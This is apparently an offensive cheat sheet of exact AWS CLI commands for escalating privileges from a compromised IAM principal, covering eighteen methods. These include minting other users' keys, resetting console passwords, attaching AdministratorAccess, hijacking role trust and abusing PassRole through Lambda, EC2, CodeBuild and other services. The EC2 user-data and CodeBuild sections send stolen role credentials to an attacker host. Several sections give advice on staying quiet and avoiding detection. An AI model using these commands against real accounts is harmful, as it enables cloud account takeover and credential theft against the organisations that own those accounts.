# AWS privilege-escalation methods — exact CLI

All commands run as the compromised principal (`--profile victim`). Account id
placeholder `198765432100`; attacker-controlled infra `203.0.113.7`. Verify
every escalation with `aws sts get-caller-identity` under the new credentials.
Detection: pmapper (map) / pacu `iam__privesc_scan` (confirm + auto-exploit).

## 1. iam:CreateAccessKey — mint keys for another user

```
aws iam create-access-key --user-name admin-alice
# -> AccessKeyId AKIA... / SecretAccessKey ...; use immediately:
AWS_ACCESS_KEY_ID=AKIA... AWS_SECRET_ACCESS_KEY=... aws sts get-caller-identity
```
Limit: 2 keys/user. If full, `aws iam list-access-keys --user-name admin-alice`
and consider deleting an *inactive* one.

## 2. iam:CreateLoginProfile / iam:UpdateLoginProfile — console takeover

```
aws iam create-login-profile --user-name admin-alice \
    --password 'CorrectHorse9!' --no-password-reset-required     # user had no console password
aws iam update-login-profile --user-name admin-alice \
    --password 'CorrectHorse9!' --no-password-reset-required     # reset existing (user is locked out -> loud)
# login: https://198765432100.signin.aws.amazon.com/console
```

## 3. iam:CreatePolicyVersion — new default version of an attached policy

```
cat > /tmp/admin.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}
EOF
aws iam create-policy-version --policy-arn arn:aws:iam::198765432100:policy/dev-policy \
    --policy-document file:///tmp/admin.json --set-as-default
```
Max 5 versions: `aws iam list-policy-versions --policy-arn ...` then
`aws iam delete-policy-version --version-id v2` on a non-default.

## 4. iam:SetDefaultPolicyVersion — flip to a fatter old version

```
aws iam list-policy-versions --policy-arn arn:aws:iam::198765432100:policy/dev-policy
aws iam get-policy-version --policy-arn ... --version-id v1      # inspect each
aws iam set-default-policy-version --policy-arn ... --version-id v1
```

## 5. iam:Attach{User,Role,Group}Policy — attach AdministratorAccess

```
aws iam attach-user-policy  --user-name dev-bob      --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam attach-role-policy  --role-name ci-runner    --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
aws iam attach-group-policy --group-name developers  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

## 6. iam:Put{User,Role,Group}Policy — inline admin policy

```
aws iam put-user-policy --user-name dev-bob --policy-name sync \
    --policy-document file:///tmp/admin.json
aws iam put-role-policy --role-name ci-runner --policy-name sync --policy-document file:///tmp/admin.json
aws iam put-group-policy --group-name developers --policy-name sync --policy-document file:///tmp/admin.json
```

## 7. iam:AddUserToGroup

```
aws iam list-groups   # find the admin group
aws iam add-user-to-group --group-name admins --user-name dev-bob
```

## 8. iam:UpdateAssumeRolePolicy — hijack a role's trust

```
cat > /tmp/trust.json <<'EOF'
{"Version":"2012-10-17","Statement":[{"Effect":"Allow",
 "Principal":{"AWS":"arn:aws:iam::198765432100:user/dev-bob"},
 "Action":"sts:AssumeRole"}]}
EOF
aws iam update-assume-role-policy --role-name prod-admin --policy-document file:///tmp/trust.json
aws sts assume-role --role-arn arn:aws:iam::198765432100:role/prod-admin --role-session-name sync
```
Quieter: *append* your principal to the existing statement list instead of
replacing (`aws iam get-role --role-name prod-admin` first), so legitimate
assumption keeps working. Cross-account: put your own account's user ARN in
Principal and assume from outside.

## 9. sts:AssumeRole chains

```
aws iam list-roles --query "Roles[?AssumeRolePolicyDocument.Statement[?Principal.AWS!=null]]" \
    --output json   # roles trusting IAM principals
aws sts assume-role --role-arn arn:aws:iam::198765432100:role/stage1 --role-session-name s
# export the returned creds, then assume the next role that trusts stage1:
aws sts assume-role --role-arn arn:aws:iam::198765432100:role/stage2 --role-session-name s
```
pmapper's `preset connected` maps these chains; session default 1h
(`--duration-seconds` up to the role max).

## 10. iam:PassRole + ec2:RunInstances — instance-profile theft

```
aws iam list-instance-profiles          # find a profile wrapping a strong role
cat > /tmp/ud.sh <<'EOF'
#!/bin/bash
TOK=$(curl -sX PUT http://169.254.169.254/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 300")
R=$(curl -s -H "X-aws-ec2-metadata-token: $TOK" http://169.254.169.254/latest/meta-data/iam/security-credentials/)
curl -s -H "X-aws-ec2-metadata-token: $TOK" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/$R | curl -sX POST -d @- http://203.0.113.7/c
EOF
aws ec2 run-instances --image-id ami-0abcdef1234567890 --instance-type t3.micro \
    --iam-instance-profile Name=prod-admin-profile \
    --user-data file:///tmp/ud.sh --count 1 --region us-east-1
```
Alternative without egress: add your `--key-name` + an open SG, SSH in, curl
IMDS yourself. Also works via `ec2:ModifyInstanceAttribute`(user-data) +
stop/start, or `ec2:AssociateIamInstanceProfile` on an instance you can shell.

## 11. iam:PassRole + lambda:CreateFunction (+ InvokeFunction / event)

```
cat > /tmp/l.py <<'EOF'
import boto3
def handler(event, context):
    boto3.client('iam').attach_user_policy(UserName='dev-bob',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
    return 'ok'
EOF
cd /tmp && zip f.zip l.py
aws lambda create-function --function-name sync-task --runtime python3.12 \
    --role arn:aws:iam::198765432100:role/lambda-admin \
    --handler l.handler --zip-file fileb:///tmp/f.zip --region us-east-1
aws lambda invoke --function-name sync-task /tmp/out.txt --region us-east-1
```
No `lambda:InvokeFunction`? Wire an event source you can trigger
(`lambda:CreateEventSourceMapping` + a DynamoDB table/stream you can write to),
or wait for a scheduled trigger. Alternative payload: STS get-session via the
role and POST the creds out.

## 12. lambda:UpdateFunctionCode — poison an existing privileged function

```
aws lambda list-functions --region us-east-1 \
    --query 'Functions[].{f:FunctionName,r:Role}'       # pick one with a strong role
aws lambda update-function-code --function-name billing-export \
    --zip-file fileb:///tmp/f.zip --region us-east-1
# invoke it, or wait for its normal trigger
```
Keep the original behavior intact (fetch old code first via
`aws lambda get-function` → Code.Location URL) so nothing visibly breaks.

## 13. iam:PassRole + glue:CreateDevEndpoint / glue:UpdateDevEndpoint

```
aws glue create-dev-endpoint --endpoint-name sync \
    --role-arn arn:aws:iam::198765432100:role/glue-admin \
    --public-key "$(cat ~/.ssh/id_rsa.pub)" --region us-east-1
aws glue get-dev-endpoint --endpoint-name sync --region us-east-1   # PublicAddress
ssh glue@<PublicAddress>   # box carries the role's creds (IMDS / env)
# UpdateExistingGlueDevEndpoint: aws glue update-dev-endpoint --endpoint-name existing --public-key ...
```

## 14. iam:PassRole + cloudformation:CreateStack

```
cat > /tmp/t.yaml <<'EOF'
Resources:
  U:
    Type: AWS::IAM::User
    Properties: {UserName: svc-sync, ManagedPolicyArns: ["arn:aws:iam::aws:policy/AdministratorAccess"]}
  K:
    Type: AWS::IAM::AccessKey
    Properties: {UserName: !Ref U}
Outputs:
  AK: {Value: !Ref K}
  SK: {Value: !GetAtt K.SecretAccessKey}
EOF
aws cloudformation create-stack --stack-name sync --template-body file:///tmp/t.yaml \
    --role-arn arn:aws:iam::198765432100:role/cfn-admin --capabilities CAPABILITY_NAMED_IAM
aws cloudformation describe-stacks --stack-name sync --query 'Stacks[0].Outputs'
```

## 15. iam:PassRole + datapipeline:CreatePipeline + PutPipelineDefinition

```
aws datapipeline create-pipeline --name sync --unique-id sync1
aws datapipeline put-pipeline-definition --pipeline-id <df-id> \
  --pipeline-definition '{"objects":[
    {"id":"Default","name":"Default","fields":[{"key":"type","stringValue":"Default"},
      {"key":"scheduleType","stringValue":"ondemand"},
      {"key":"role","stringValue":"pipeline-admin"},
      {"key":"resourceRole","stringValue":"pipeline-admin-profile"}]},
    {"id":"A","name":"A","fields":[{"key":"type","stringValue":"ShellCommandActivity"},
      {"key":"command","stringValue":"aws iam attach-user-policy --user-name dev-bob --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"},
      {"key":"runsOn","refValue":"R"}]},
    {"id":"R","name":"R","fields":[{"key":"type","stringValue":"Ec2Resource"},
      {"key":"instanceType","stringValue":"t3.micro"},
      {"key":"terminateAfter","stringValue":"10 Minutes"}]}]}'
aws datapipeline activate-pipeline --pipeline-id <df-id>
```

## 16. iam:PassRole + sagemaker:CreateNotebookInstance

```
aws sagemaker create-notebook-instance --notebook-instance-name sync \
    --instance-type ml.t3.medium --role-arn arn:aws:iam::198765432100:role/sagemaker-admin
aws sagemaker create-presigned-notebook-instance-url --notebook-instance-name sync
# open URL -> Jupyter -> terminal -> `aws sts get-caller-identity` runs as the role
```
Related: `sagemaker:CreatePresignedNotebookInstanceUrl` alone hijacks an
*existing* notebook's role.

## 17. iam:PassRole + codebuild:CreateProject + StartBuild

```
aws codebuild create-project --name sync \
  --source '{"type":"NO_SOURCE","buildspec":"version: 0.2\nphases:\n  build:\n    commands:\n      - curl -s $AWS_CONTAINER_CREDENTIALS_RELATIVE_URI | curl -sX POST -d @- http://203.0.113.7/c"}' \
  --artifacts '{"type":"NO_ARTIFACTS"}' \
  --environment '{"type":"LINUX_CONTAINER","image":"aws/codebuild/standard:7.0","computeType":"BUILD_GENERAL1_SMALL"}' \
  --service-role arn:aws:iam::198765432100:role/codebuild-admin
aws codebuild start-build --project-name sync
```
(Container creds endpoint is `http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`.)

## 18. ssm:SendCommand / ssm:StartSession — steal an instance role

```
aws ssm describe-instance-information --region us-east-1      # managed instances
aws ssm send-command --instance-ids i-0abc1234 --document-name AWS-RunShellScript \
    --parameters 'commands=["curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/prod-admin"]' \
    --region us-east-1
aws ssm get-command-invocation --command-id <id> --instance-id i-0abc1234 --region us-east-1
# interactive:
aws ssm start-session --target i-0abc1234 --region us-east-1
```
Pacu equivalent: `systemsmanager__rce_ec2 --all-instances --command ...`.

## Cleanup checklist (deploy-compute methods)

`aws lambda delete-function`, `aws ec2 terminate-instances`,
`aws cloudformation delete-stack`, `aws glue delete-dev-endpoint`,
`aws sagemaker delete-notebook-instance`, `aws codebuild delete-project`,
`aws datapipeline delete-pipeline` — after extracting credentials.
All of these log to CloudTrail; check `detection__enum_services` (pacu) first.
